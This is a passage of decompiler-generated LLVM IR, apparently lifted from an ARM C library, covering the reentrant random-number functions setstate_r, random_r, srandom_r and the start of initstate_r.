  br label %.thread4

.thread4:                                         ; preds = %dec_label_pc_178cc, %bb
  %v10_178e0 = phi i32 [ %arg1, %dec_label_pc_178cc ], [ 0, %bb ]
  ret i32 %v10_178e0

; uselistorder directives
  uselistorder label %.thread4, { 1, 0 }
}

define i32 @setstate_r(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_178e4 = load i32, i32* @r4, align 4
  store i32 %v3_178e4, i32* %stack_var_-20, align 4
  store i32 %tmp, i32* %r4.global-to-local, align 4
  %v1_178ec = add i32 %tmp, 12
  %v2_178ec = inttoptr i32 %v1_178ec to i8*
  %v3_178ec = load i8, i8* %v2_178ec, align 1
  %v4_178ec = zext i8 %v3_178ec to i32
  store i32 %v4_178ec, i32* %r1.global-to-local, align 4
  %v2_178f0 = icmp eq i8 %v3_178ec, 0
  store i1 %v2_178f0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_178f0, label %.thread5, label %.thread6

.thread5:                                         ; preds = %entry
  %v1_178f812 = add i32 %arg1, 4
  store i32 %v1_178f812, i32* %r6.global-to-local, align 4
  %v1_178fc13 = add i32 %tmp, 8
  %v2_178fc14 = inttoptr i32 %v1_178fc13 to i32*
  %v3_178fc15 = load i32, i32* %v2_178fc14, align 4
  store i32 %v3_178fc15, i32* %r0.global-to-local, align 4
  %v3_17918 = add i32 %v3_178fc15, -4
  %v4_17918 = inttoptr i32 %v3_17918 to i32*
  store i32 %v4_178ec, i32* %v4_17918, align 4
  br label %bb

.thread6:                                         ; preds = %entry
  %v2_178f4 = add i32 %tmp, 4
  %v3_178f4 = inttoptr i32 %v2_178f4 to i32*
  %v4_178f4 = load i32, i32* %v3_178f4, align 4
  %v1_178f8 = add i32 %arg1, 4
  store i32 %v1_178f8, i32* %r6.global-to-local, align 4
  %v1_178fc = add i32 %tmp, 8
  %v2_178fc = inttoptr i32 %v1_178fc to i32*
  %v3_178fc = load i32, i32* %v2_178fc, align 4
  store i32 %v3_178fc, i32* %r0.global-to-local, align 4
  %v3_17904 = sub i32 %v4_178f4, %v3_178fc
  %v4_17908 = sdiv i32 %v3_17904, 4
  %v4_1790c = sext i8 %v3_178ec to i32
  store i32 %v4_1790c, i32* %r1.global-to-local, align 4
  %v4_17914 = mul i32 %v4_17908, 5
  %v5_17914 = add i32 %v4_17914, %v4_1790c
  %v3_1791c = add i32 %v3_178fc, -4
  %v4_1791c = inttoptr i32 %v3_1791c to i32*
  store i32 %v5_17914, i32* %v4_1791c, align 4
  br label %bb

bb:                                               ; preds = %.thread5, %.thread6
  %v0_17924 = load i32, i32* %r6.global-to-local, align 4
  %v1_17924 = add i32 %v0_17924, -4
  %v2_17924 = inttoptr i32 %v1_17924 to i32*
  %v3_17924 = load i32, i32* %v2_17924, align 4
  %v2_1792c = udiv i32 %v3_17924, 5
  %v3_1792c = urem i32 %v3_17924, 5
  store i32 %v2_1792c, i32* %r0.global-to-local, align 4
  store i32 %v3_1792c, i32* %r1.global-to-local, align 4
  %v2_17934 = icmp ugt i32 %v3_1792c, 3
  %v7_17934 = icmp eq i32 %v3_1792c, 4
  store i1 %v7_17934, i1* %cpsr_z.global-to-local, align 1
  store i32 ptrtoint (i16* @global_var_2c158.876 to i32), i32* %r5.global-to-local, align 4
  %v2_1793c = xor i1 %v7_17934, true
  %v3_1793c = and i1 %v2_17934, %v2_1793c
  br i1 %v3_1793c, label %dec_label_pc_179a4, label %dec_label_pc_17940

dec_label_pc_17940:                               ; preds = %bb
  %v4_17948 = mul nuw nsw i32 %v3_1792c, 4
  %v5_17948 = add i32 %v4_17948, add (i32 ptrtoint (i16* @global_var_2c158.876 to i32), i32 -34004)
  %v1_1794c = add i32 %v4_17948, add (i32 ptrtoint (i16* @global_var_2c158.876 to i32), i32 -33984)
  %v2_1794c = inttoptr i32 %v1_1794c to i32*
  %v3_1794c = load i32, i32* %v2_1794c, align 4
  store i32 %v3_1794c, i32* %r5.global-to-local, align 4
  %v6_17950 = inttoptr i32 %v5_17948 to i32*
  %v7_17950 = load i32, i32* %v6_17950, align 4
  store i32 %v7_17950, i32* %r7.global-to-local, align 4
  %v2_17954 = icmp eq i32 %v3_1792c, 0
  store i1 %v2_17954, i1* %cpsr_z.global-to-local, align 1
  %v1_17958 = trunc i32 %v3_1794c to i8
  %v2_17958 = load i32, i32* %r4.global-to-local, align 4
  %v3_17958 = add i32 %v2_17958, 13
  %v4_17958 = inttoptr i32 %v3_17958 to i8*
  store i8 %v1_17958, i8* %v4_17958, align 1
  %v0_1795c = load i32, i32* %r7.global-to-local, align 4
  %v1_1795c = trunc i32 %v0_1795c to i8
  %v2_1795c = load i32, i32* %r4.global-to-local, align 4
  %v3_1795c = add i32 %v2_1795c, 14
  %v4_1795c = inttoptr i32 %v3_1795c to i8*
  store i8 %v1_1795c, i8* %v4_1795c, align 1
  %v0_17960 = load i32, i32* %r1.global-to-local, align 4
  %v1_17960 = trunc i32 %v0_17960 to i8
  %v2_17960 = load i32, i32* %r4.global-to-local, align 4
  %v3_17960 = add i32 %v2_17960, 12
  %v4_17960 = inttoptr i32 %v3_17960 to i8*
  store i8 %v1_17960, i8* %v4_17960, align 1
  %v0_17964 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_17964, label %dec_label_pc_17990, label %dec_label_pc_17968

dec_label_pc_17968:                               ; preds = %dec_label_pc_17940
  store i32 5, i32* %r1.global-to-local, align 4
  %v0_1796c = load i32, i32* %r6.global-to-local, align 4
  %v1_1796c = add i32 %v0_1796c, -4
  %v2_1796c = inttoptr i32 %v1_1796c to i32*
  %v3_1796c = load i32, i32* %v2_1796c, align 4
  %v2_17970 = sdiv i32 %v3_1796c, 5
  store i32 %v2_17970, i32* %r0.global-to-local, align 4
  %v4_17974 = mul i32 %v2_17970, 4
  %v5_17974 = add i32 %v4_17974, %v0_1796c
  %v1_17978 = load i32, i32* %r4.global-to-local, align 4
  %v2_17978 = add i32 %v1_17978, 4
  %v3_17978 = inttoptr i32 %v2_17978 to i32*
  store i32 %v5_17974, i32* %v3_17978, align 4
  %v0_1797c = load i32, i32* %r7.global-to-local, align 4
  %v1_1797c = load i32, i32* %r0.global-to-local, align 4
  %v2_1797c = add i32 %v1_1797c, %v0_1797c
  %v0_17980 = load i32, i32* %r5.global-to-local, align 4
  %v2_17984 = udiv i32 %v2_1797c, %v0_17980
  %v3_17984 = urem i32 %v2_1797c, %v0_17980
  store i32 %v2_17984, i32* %r0.global-to-local, align 4
  %v0_17988 = load i32, i32* %r6.global-to-local, align 4
  %v4_17988 = mul i32 %v3_17984, 4
  %v5_17988 = add i32 %v0_17988, %v4_17988
  store i32 %v5_17988, i32* %r1.global-to-local, align 4
  %v1_1798c = load i32, i32* %r4.global-to-local, align 4
  %v2_1798c = inttoptr i32 %v1_1798c to i32*
  store i32 %v5_17988, i32* %v2_1798c, align 4
  br label %dec_label_pc_17990

dec_label_pc_17990:                               ; preds = %dec_label_pc_17940, %dec_label_pc_17968
  %v0_17990 = load i32, i32* %r6.global-to-local, align 4
  %v1_17990 = load i32, i32* %r5.global-to-local, align 4
  %v4_17990 = mul i32 %v1_17990, 4
  %v5_17990 = add i32 %v4_17990, %v0_17990
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_17998 = load i32, i32* %r4.global-to-local, align 4
  %v2_17998 = add i32 %v1_17998, 16
  %v3_17998 = inttoptr i32 %v2_17998 to i32*
  store i32 %v5_17990, i32* %v3_17998, align 4
  %v0_1799c = load i32, i32* %r6.global-to-local, align 4
  %v1_1799c = load i32, i32* %r4.global-to-local, align 4
  %v2_1799c = add i32 %v1_1799c, 8
  %v3_1799c = inttoptr i32 %v2_1799c to i32*
  store i32 %v0_1799c, i32* %v3_1799c, align 4
  %v1_179bc.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_179b4

dec_label_pc_179a4:                               ; preds = %bb
  %v0_179a4 = call i32 @__GI___errno_location()
  %v2_179ac = inttoptr i32 %v0_179a4 to i32*
  store i32 22, i32* %v2_179ac, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_179b4

dec_label_pc_179b4:                               ; preds = %dec_label_pc_17990, %dec_label_pc_179a4
  %v1_179bc = phi i32 [ %v1_179bc.pre, %dec_label_pc_17990 ], [ -1, %dec_label_pc_179a4 ]
  %v2_179b8 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_179b8, i32* @r4, align 4
  ret i32 %v1_179bc

; uselistorder directives
  uselistorder i32 %v0_17980, { 1, 0 }
  uselistorder i32 %v2_1797c, { 1, 0 }
  uselistorder i32 %v3_17924, { 1, 0 }
  uselistorder i32 %tmp, { 1, 2, 0, 4, 3, 5 }
  uselistorder i32* %r6.global-to-local, { 1, 2, 3, 4, 5, 0, 6 }
  uselistorder i32* %r1.global-to-local, { 3, 4, 1, 2, 5, 6, 0 }
  uselistorder i32* %r0.global-to-local, { 5, 6, 7, 2, 0, 1, 4, 8, 9, 3 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_179b4, { 1, 0 }
  uselistorder label %dec_label_pc_17990, { 1, 0 }
  uselistorder label %bb, { 1, 0 }
}

define i32 @__GI_random_r(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_179c8 = load i32, i32* @r4, align 4
  store i32 %v3_179c8, i32* %stack_var_-8, align 4
  %v1_179cc = add i32 %tmp, 12
  %v2_179cc = inttoptr i32 %v1_179cc to i8*
  %v3_179cc = load i8, i8* %v2_179cc, align 1
  %v4_179cc = sext i8 %v3_179cc to i32
  store i32 %v4_179cc, i32* %r3.global-to-local, align 4
  %v2_179d0 = icmp eq i8 %v3_179cc, 0
  store i32 %tmp, i32* %ip.global-to-local, align 4
  store i32 %arg2, i32* %r4.global-to-local, align 4
  %v1_179dc = add i32 %tmp, 8
  %v2_179dc = inttoptr i32 %v1_179dc to i32*
  %v3_179dc = load i32, i32* %v2_179dc, align 4
  store i32 %v3_179dc, i32* %lr.global-to-local, align 4
  br i1 %v2_179d0, label %dec_label_pc_179e4, label %dec_label_pc_17a08

dec_label_pc_179e4:                               ; preds = %entry
  %v1_179e4 = inttoptr i32 %v3_179dc to i32*
  %v2_179e4 = load i32, i32* %v1_179e4, align 4
  store i32 %v2_179e4, i32* %r2.global-to-local, align 4
  %v2_179ec = mul i32 %v2_179e4, 1103515245
  %v1_179f4 = add i32 %v2_179ec, 12345
  %tmp6 = bitcast i32 %v1_179f4 to float
  %tmp7 = call float @fabsf(float %tmp6)
  %v1_179f8 = bitcast float %tmp7 to i32
  store i32 %v1_179f8, i32* %r3.global-to-local, align 4
  store i32 %v1_179f8, i32* %v1_179e4, align 4
  %v0_17a00 = load i32, i32* %r3.global-to-local, align 4
  %v2_17a00 = inttoptr i32 %arg2 to i32*
  store i32 %v0_17a00, i32* %v2_17a00, align 4
  br label %dec_label_pc_17a48

dec_label_pc_17a08:                               ; preds = %entry
  %v2_17a08 = load i32, i32* %arg1, align 4
  store i32 %v2_17a08, i32* %r2.global-to-local, align 4
  %v1_17a0c = add i32 %tmp, 4
  %v2_17a0c = inttoptr i32 %v1_17a0c to i32*
  %v3_17a0c = load i32, i32* %v2_17a0c, align 4
  store i32 %v3_17a0c, i32* %r0.global-to-local, align 4
  %v1_17a10 = inttoptr i32 %v2_17a08 to i32*
  %v2_17a10 = load i32, i32* %v1_17a10, align 4
  store i32 %v2_17a10, i32* %r1.global-to-local, align 4
  %v1_17a14 = inttoptr i32 %v3_17a0c to i32*
  %v2_17a14 = load i32, i32* %v1_17a14, align 4
  %v4_17a14 = add i32 %v3_17a0c, 4
  store i32 %v4_17a14, i32* %r0.global-to-local, align 4
  %v2_17a18 = add i32 %v2_17a14, %v2_17a10
  store i32 %v2_17a18, i32* %r3.global-to-local, align 4
  store i32 %v2_17a18, i32* %v1_17a10, align 4
  %v3_17a1c = load i32, i32* %r2.global-to-local, align 4
  %v4_17a1c = add i32 %v3_17a1c, 4
  store i32 %v4_17a1c, i32* %r2.global-to-local, align 4
  %v0_17a20 = load i32, i32* %ip.global-to-local, align 4
  %v1_17a20 = add i32 %v0_17a20, 16
  %v2_17a20 = inttoptr i32 %v1_17a20 to i32*
  %v3_17a20 = load i32, i32* %v2_17a20, align 4
  store i32 %v3_17a20, i32* %r1.global-to-local, align 4
  %v0_17a24 = load i32, i32* %r3.global-to-local, align 4
  %v3_17a24 = udiv i32 %v0_17a24, 2
  store i32 %v3_17a24, i32* %r3.global-to-local, align 4
  %v3_17a28 = icmp ult i32 %v4_17a1c, %v3_17a20
  %v1_17a2c = load i32, i32* %r4.global-to-local, align 4
  %v2_17a2c = inttoptr i32 %v1_17a2c to i32*
  store i32 %v3_17a24, i32* %v2_17a2c, align 4
  br i1 %v3_17a28, label %dec_label_pc_17a38, label %._crit_edge

._crit_edge:                                      ; preds = %dec_label_pc_17a08
  %v1_17a30 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v1_17a30, i32* %r2.global-to-local, align 4
  %v0_17a40.pre = load i32, i32* %r0.global-to-local, align 4
  br label %bb5

dec_label_pc_17a38:                               ; preds = %dec_label_pc_17a08
  %v0_17a38 = load i32, i32* %r0.global-to-local, align 4
  %v1_17a38 = load i32, i32* %r1.global-to-local, align 4
  %v3_17a38 = icmp ult i32 %v0_17a38, %v1_17a38
  br i1 %v3_17a38, label %bb5, label %bb

bb:                                               ; preds = %dec_label_pc_17a38
  %v1_17a3c = load i32, i32* %lr.global-to-local, align 4
  store i32 %v1_17a3c, i32* %r0.global-to-local, align 4
  br label %bb5

bb5:                                              ; preds = %dec_label_pc_17a38, %._crit_edge, %bb
  %v0_17a40 = phi i32 [ %v0_17a40.pre, %._crit_edge ], [ %v0_17a38, %dec_label_pc_17a38 ], [ %v1_17a3c, %bb ]
  %v1_17a40 = load i32, i32* %ip.global-to-local, align 4
  %v2_17a40 = add i32 %v1_17a40, 4
  %v3_17a40 = inttoptr i32 %v2_17a40 to i32*
  store i32 %v0_17a40, i32* %v3_17a40, align 4
  %v0_17a44 = load i32, i32* %r2.global-to-local, align 4
  %v1_17a44 = load i32, i32* %ip.global-to-local, align 4
  %v2_17a44 = inttoptr i32 %v1_17a44 to i32*
  store i32 %v0_17a44, i32* %v2_17a44, align 4
  br label %dec_label_pc_17a48

dec_label_pc_17a48:                               ; preds = %dec_label_pc_179e4, %bb5
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_17a4c = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_17a4c, i32* @r4, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v3_17a24, { 1, 0 }
  uselistorder i32 %v1_179f8, { 1, 0 }
  uselistorder i32 %tmp, { 0, 3, 2, 1, 4 }
  uselistorder i32* %r2.global-to-local, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 4, 3, 5, 6, 0 }
  uselistorder label %dec_label_pc_17a48, { 1, 0 }
  uselistorder label %bb5, { 2, 0, 1 }
}

define i32 @srandom_r(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_17a58 = load i32, i32* @r4, align 4
  store i32 %v3_17a58, i32* %stack_var_-36, align 4
  %v1_17a5c = add i32 %tmp, 12
  %v2_17a5c = inttoptr i32 %v1_17a5c to i8*
  %v3_17a5c = load i8, i8* %v2_17a5c, align 1
  store i32 %tmp, i32* %r5.global-to-local, align 4
  %v3_17a6c = load i8, i8* %v2_17a5c, align 1
  %tmp33 = icmp ugt i8 %v3_17a5c, 4
  br i1 %tmp33, label %.dec_label_pc_17b18_crit_edge, label %dec_label_pc_17a78

.dec_label_pc_17b18_crit_edge:                    ; preds = %entry
  br label %dec_label_pc_17b18

dec_label_pc_17a78:                               ; preds = %entry
  %v0_17a78 = load i32, i32* @r0, align 4
  %v2_17a78 = icmp eq i32 %v0_17a78, 0
  %v1_17a7c = add i32 %tmp, 8
  %v2_17a7c = inttoptr i32 %v1_17a7c to i32*
  %v3_17a7c = load i32, i32* %v2_17a7c, align 4
  store i32 %v3_17a7c, i32* %r6.global-to-local, align 4
  br i1 %v2_17a78, label %bb, label %bb23

bb:                                               ; preds = %dec_label_pc_17a78
  store i32 1, i32* @r0, align 4
  br label %bb23

bb23:                                             ; preds = %dec_label_pc_17a78, %bb
  %v0_17a88 = phi i32 [ %v0_17a78, %dec_label_pc_17a78 ], [ 1, %bb ]
  %v2_17a84 = icmp eq i8 %v3_17a6c, 0
  %v2_17a88 = inttoptr i32 %v3_17a7c to i32*
  store i32 %v0_17a88, i32* %v2_17a88, align 4
  br i1 %v2_17a84, label %dec_label_pc_17b14, label %dec_label_pc_17a90

dec_label_pc_17a90:                               ; preds = %bb23
  %v1_17a90 = add i32 %tmp, 13
  %v2_17a90 = inttoptr i32 %v1_17a90 to i8*
  %v3_17a90 = load i8, i8* %v2_17a90, align 1
  %v4_17a90 = sext i8 %v3_17a90 to i32
  store i32 %v4_17a90, i32* %sl.global-to-local, align 4
  store i32 16807, i32* %fp.global-to-local, align 4
  store i32 2836, i32* %sb.global-to-local, align 4
  %v0_17a9c = load i32, i32* @r0, align 4
  store i32 %v0_17a9c, i32* %r4.global-to-local, align 4
  %v0_17aa0 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_17aa0, i32* %r8.global-to-local, align 4
  store i32 2, i32* %r7.global-to-local, align 4
  %v5_17ae025 = icmp sgt i8 %v3_17a90, 1
  br i1 %v5_17ae025, label %dec_label_pc_17aac, label %dec_label_pc_17ae4

dec_label_pc_17aac:                               ; preds = %dec_label_pc_17a90, %dec_label_pc_17aac.dec_label_pc_17aac_crit_edge
  %v1_17ac0 = phi i32 [ %v1_17ac0.pre, %dec_label_pc_17aac.dec_label_pc_17aac_crit_edge ], [ 2836, %dec_label_pc_17a90 ]
  %v1_17ab4 = phi i32 [ %v1_17ab4.pre, %dec_label_pc_17aac.dec_label_pc_17aac_crit_edge ], [ 16807, %dec_label_pc_17a90 ]
  %v0_17ab027 = phi i32 [ %v0_17ad4.pre, %dec_label_pc_17aac.dec_label_pc_17aac_crit_edge ], [ %v0_17a9c, %dec_label_pc_17a90 ]
  %v1_17acc26 = phi i32 [ %v5_17acc, %dec_label_pc_17aac.dec_label_pc_17aac_crit_edge ], [ %v0_17aa0, %dec_label_pc_17a90 ]
  %v3_17aac = urem i32 %v0_17ab027, 127773
  %v2_17ab4 = mul i32 %v1_17ab4, %v3_17aac
  %v2_17abc = sdiv i32 %v0_17ab027, 127773
  %v2_17ac0 = mul i32 %v1_17ac0, %v2_17abc
  %v2_17ac4 = sub i32 %v2_17ab4, %v2_17ac0
  %v8_17ac4 = icmp slt i32 %v2_17ac4, 0
  %v2_17ac8 = add i32 %v2_17ac4, 2147483647
  %v2_17ac8.v2_17ac4 = select i1 %v8_17ac4, i32 %v2_17ac8, i32 %v2_17ac4
  store i32 %v2_17ac8.v2_17ac4, i32* %r4.global-to-local, align 4
  %v2_17acc = add i32 %v1_17acc26, 4
  %v3_17acc = inttoptr i32 %v2_17acc to i32*
  store i32 %v2_17ac8.v2_17ac4, i32* %v3_17acc, align 4
  %v4_17acc = load i32, i32* %r8.global-to-local, align 4
  %v5_17acc = add i32 %v4_17acc, 4
  store i32 %v5_17acc, i32* %r8.global-to-local, align 4
  %v0_17ad0.pre = load i32, i32* %r7.global-to-local, align 4
  %v1_17ad0.pre = load i32, i32* %sl.global-to-local, align 4
  %v0_17ad4.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_17adc = add i32 %v0_17ad0.pre, 1
  store i32 %v1_17adc, i32* %r7.global-to-local, align 4
  %v5_17ae0 = icmp slt i32 %v0_17ad0.pre, %v1_17ad0.pre
  br i1 %v5_17ae0, label %dec_label_pc_17aac.dec_label_pc_17aac_crit_edge, label %dec_label_pc_17ad0.dec_label_pc_17ae4_crit_edge

dec_label_pc_17aac.dec_label_pc_17aac_crit_edge:  ; preds = %dec_label_pc_17aac
  %v1_17ab4.pre = load i32, i32* %fp.global-to-local, align 4
  %v1_17ac0.pre = load i32, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_17aac

dec_label_pc_17ad0.dec_label_pc_17ae4_crit_edge:  ; preds = %dec_label_pc_17aac
  %v0_17af4.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_17ae4

dec_label_pc_17ae4:                               ; preds = %dec_label_pc_17ad0.dec_label_pc_17ae4_crit_edge, %dec_label_pc_17a90
  %v0_17af4 = phi i32 [ %v0_17af4.pre, %dec_label_pc_17ad0.dec_label_pc_17ae4_crit_edge ], [ %v0_17aa0, %dec_label_pc_17a90 ]
  %v0_17ae8.lcssa = phi i32 [ %v1_17ad0.pre, %dec_label_pc_17ad0.dec_label_pc_17ae4_crit_edge ], [ %v4_17a90, %dec_label_pc_17a90 ]
  %v2_17ae8 = mul i32 %v0_17ae8.lcssa, 10
  store i32 %v2_17ae8, i32* @r4, align 4
  %v0_17aec = load i32, i32* %r5.global-to-local, align 4
  %v1_17aec = add i32 %v0_17aec, 14
  %v2_17aec = inttoptr i32 %v1_17aec to i8*
  %v3_17aec = load i8, i8* %v2_17aec, align 1
  %v4_17aec = sext i8 %v3_17aec to i32
  %v2_17af0 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_17af0, i32* %r7.global-to-local, align 4
  %v4_17af4 = mul nsw i32 %v4_17aec, 4
  %v5_17af4 = add i32 %v0_17af4, %v4_17af4
  %v1_17af8 = inttoptr i32 %v0_17aec to i32*
  store i32 %v5_17af4, i32* %v1_17af8, align 4
  %v3_17af8 = add i32 %v0_17aec, 4
  %v4_17af8 = inttoptr i32 %v3_17af8 to i32*
  %v5_17af8 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v5_17af8, i32* %v4_17af8, align 4
  br label %dec_label_pc_17b04

dec_label_pc_17b00:                               ; preds = %dec_label_pc_17b04
  %v0_17b08 = load i32, i32* %r5.global-to-local, align 4
  %v2_17b00 = inttoptr i32 %v0_17b08 to i32*
  %v3_17b00 = call i32 @__GI_random_r(i32* %v2_17b00, i32 %v2_17af0)
  br label %dec_label_pc_17b04

dec_label_pc_17b04:                               ; preds = %dec_label_pc_17ae4, %dec_label_pc_17b00
  %v0_17b04 = load i32, i32* @r4, align 4
  %v1_17b04 = add i32 %v0_17b04, -1
  store i32 %v1_17b04, i32* @r4, align 4
  %v6_17b04 = icmp slt i32 %v1_17b04, 0
  br i1 %v6_17b04, label %dec_label_pc_17b14, label %dec_label_pc_17b00

dec_label_pc_17b14:                               ; preds = %dec_label_pc_17b04, %bb23
  %v2_17b1c.pre = load i32, i32* %stack_var_-36, align 4
  br label %dec_label_pc_17b18

dec_label_pc_17b18:                               ; preds = %.dec_label_pc_17b18_crit_edge, %dec_label_pc_17b14
  %v2_17b1c = phi i32 [ %v3_17a58, %.dec_label_pc_17b18_crit_edge ], [ %v2_17b1c.pre, %dec_label_pc_17b14 ]
  %v1_17b20 = phi i32 [ -1, %.dec_label_pc_17b18_crit_edge ], [ 0, %dec_label_pc_17b14 ]
  store i32 %v2_17b1c, i32* @r4, align 4
  ret i32 %v1_17b20

; uselistorder directives
  uselistorder i32 %v1_17b04, { 1, 0 }
  uselistorder i32 %v0_17aec, { 1, 0, 2 }
  uselistorder i32 %v0_17ad0.pre, { 1, 0 }
  uselistorder i32 %v5_17acc, { 1, 0 }
  uselistorder i32 %v0_17ab027, { 1, 0 }
  uselistorder i32 %v0_17aa0, { 1, 0, 2 }
  uselistorder i32 %tmp, { 0, 1, 3, 2 }
  uselistorder i32* %r6.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32* %r4.global-to-local, { 1, 2, 0 }
  uselistorder i32 127773, { 1, 0 }
  uselistorder label %dec_label_pc_17b18, { 1, 0 }
  uselistorder label %dec_label_pc_17b04, { 1, 0 }
  uselistorder label %dec_label_pc_17aac, { 1, 0 }
  uselistorder label %bb23, { 1, 0 }
}

define i32 @"$d.1"(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_17b24:
  %v0_17b24 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_17b24, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_17b24
  %v2_17b24 = load i32, i32* @r7, align 4
  %v5_17b24 = udiv i32 %v2_17b24, 8
  %v6_17b24 = and i32 %v5_17b24, %arg1
  %v3_17b28 = load i32, i32* @fp, align 4
  %v8_17b28 = shl i32 %v6_17b24, %v3_17b28
  %v9_17b28 = and i32 %v8_17b28, %arg1
  %v2_17b2c = load i32, i32* @sp, align 4
  %v8_17b2c = shl i32 %v2_17b2c, %arg3
  %v9_17b2c = and i32 %v8_17b2c, %arg2
  call void @__pseudo_branch(i32 %v9_17b2c)
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_17b24, %bb
  %v10_17b2c = phi i32 [ %arg1, %dec_label_pc_17b24 ], [ %v9_17b28, %bb ]
  ret i32 %v10_17b2c

; uselistorder directives
  uselistorder i32 %arg1, { 2, 0, 1 }
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @__GI_initstate_r(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r3.global-to-local, align 4
  store i32 %arg2, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %v3_17b30 = load i32, i32* @r4, align 4
  %v6_17b30 = load i32, i32* @r5, align 4
  store i32 %tmp, i32* @r7, align 4
  store i32 %arg3, i32* @r5, align 4
  %tmp28 = icmp ult i32 %arg2, 128
  br i1 %tmp28, label %dec_label_pc_17b60, label %dec_label_pc_17b50

dec_label_pc_17b50:                               ; preds = %entry
  %v2_17b50 = icmp ugt i32 %arg2, 254
  %v7_17b50 = icmp eq i32 %arg2, 255
  %v2_17b54 = xor i1 %v7_17b50, true
  %v3_17b54 = and i1 %v2_17b50, %v2_17b54
  br i1 %v3_17b54, label %bb, label %bb21

bb:                                               ; preds = %dec_label_pc_17b50
  store i32 4, i32* @r4, align 4
  br label %bb21

bb21:                                             ; preds = %dec_label_pc_17b50, %bb
  %v1_17b8c7 = phi i32 [ %v3_17b30, %dec_label_pc_17b50 ], [ 4, %bb ]
  %v2_17b58 = xor i1 %v2_17b50, true
  %v3_17b58 = or i1 %v7_17b50, %v2_17b58
  br i1 %v3_17b58, label %bb22, label %bb26

bb22:                                             ; preds = %bb21
  store i32 3, i32* @r4, align 4
  br label %bb26

dec_label_pc_17b60:                               ; preds = %entry
  %tmp29 = icmp ugt i32 %arg2, 31
  br i1 %tmp29, label %dec_label_pc_17b78, label %dec_label_pc_17b68

dec_label_pc_17b68:                               ; preds = %dec_label_pc_17b60
  %tmp30 = icmp ugt i32 %arg2, 7
  br i1 %tmp30, label %.thread10, label %dec_label_pc_17be8

.thread10:                                        ; preds = %dec_label_pc_17b68
  store i32 0, i32* @r4, align 4
  br label %bb26

dec_label_pc_17b78:                               ; preds = %dec_label_pc_17b60
  %v2_17b78 = icmp ugt i32 %arg2, 62
  %v7_17b78 = icmp eq i32 %arg2, 63
  %v2_17b7c = xor i1 %v7_17b78, true
  %v3_17b7c = and i1 %v2_17b78, %v2_17b7c
  br i1 %v3_17b7c, label %bb23, label %bb24

bb23:                                             ; preds = %dec_label_pc_17b78
  store i32 2, i32* @r4, align 4
  br label %bb24

bb24:                                             ; preds = %dec_label_pc_17b78, %bb23
  %v1_17b8c6 = phi i32 [ %v3_17b30, %dec_label_pc_17b78 ], [ 2, %bb23 ]
  %v2_17b80 = xor i1 %v2_17b78, true
  %v3_17b80 = or i1 %v7_17b78, %v2_17b80
  br i1 %v3_17b80, label %bb25, label %bb26

bb25:                                             ; preds = %bb24
  store i32 1, i32* @r4, align 4
  br label %bb26

bb26:                                             ; preds = %.thread10, %bb22, %bb21, %bb24, %bb25
